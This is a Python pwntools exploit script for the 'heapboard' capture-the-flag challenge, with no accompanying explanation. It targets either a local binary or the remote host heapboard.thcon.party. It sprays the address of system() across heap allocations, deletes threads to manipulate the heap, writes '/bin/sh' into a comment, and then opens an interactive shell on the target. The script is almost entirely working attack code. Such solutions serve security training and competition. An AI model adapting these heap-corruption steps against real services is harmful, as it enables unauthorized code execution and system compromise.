#!/usr/bin/env python2

from pwn import *

###

if len(sys.argv) > 1:
    DEBUG = False
else:
    DEBUG = True

b = ELF('heapboard')
context.log_level = 'info'

###

if DEBUG:
    r = process('./heapboard')
else:
    r = remote('heapboard.thcon.party', 5555)

def menu():
    global r
    r.recvuntil('> ', timeout=0.5)

def add(author, title, content):
    global r
    r.sendline('1')
    r.recvuntil('Author: ')
    r.sendline(author)
    r.recvuntil('Title: ')
    r.sendline(title)
    r.recvuntil('Content: ')
    r.sendline(content)
    menu()

def comment(com):
    global r
    r.sendline('1')
    r.recvuntil('Comment: ', timeout=0.5)
    r.sendline(com)
    menu()

menu()
add('toto', 'titi', 'tutu')
add(p32(b.symbols['system']) * 10, p32(b.symbols['system']) * 10, p32(b.symbols['system']) * 5000)
add('toto', 'titi', p32(b.symbols['system']) * 5000)
add('toto', 'titi', 'tutu')
r.sendline('2') # we want to delete some thread
menu()
r.sendline('2') # delete thread
menu()
r.sendline('3') # delete thread
menu()
# now increasing comment
r.sendline('2')
menu()
r.sendline('3') # choosing the thread to edit
menu()
comment('/bin/sh')

for x in xrange(0x7f):
    log.info(x)
    r.sendline('2')
    menu()
    r.sendline('3') # choosing the thread to edit
    menu()
    comment('\x00')

GDB = True
if GDB and DEBUG:
    gdb.attach(r, '''b *0x08048904''')
r.sendline('2')
menu()
r.sendline('3')
menu()
r.sendline('3')
r.interactive()
